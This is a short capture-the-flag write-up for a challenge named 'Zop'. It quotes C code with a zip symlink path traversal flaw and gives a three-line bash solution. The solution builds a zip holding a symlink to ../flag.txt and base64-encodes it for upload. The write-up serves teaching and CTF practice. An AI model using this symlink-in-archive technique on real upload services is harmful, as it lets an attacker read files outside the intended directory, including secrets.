# Zop

## Description
ZAP ZIP ZOP ZAB ZIB ZOB... I'm just trying to overwhelm you with useless code.

## Writeup
Although this challenge contains a lot of code, it was designed to teach players about the genius design of the pkzip format. Check the [documentation](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html) for more details.

The program contains a zip symlink path traversal vulnerability:
```c
if ((cfh->external_attrs | 0xa0000000) == cfh->external_attrs){
    fd = open(filename, O_RDONLY);
    if (fd < 0)
        return;
    symbol_name = malloc(cfh->uncompressed_size + 1);
    read(fd, symbol_name, cfh->uncompressed_size);
    close(fd);
    remove(filename);
    symlink(symbol_name, filename);
    free(symbol_name);
}
```
This means that if a zip file with a symlink to any directory is uploaded, it will be read.

The solution can be accomplished in three lines of bash code:

```sh
ln -s ../flag.txt alt.txt
zip --symlinks pay alt.txt
cat pay.zip | base64
```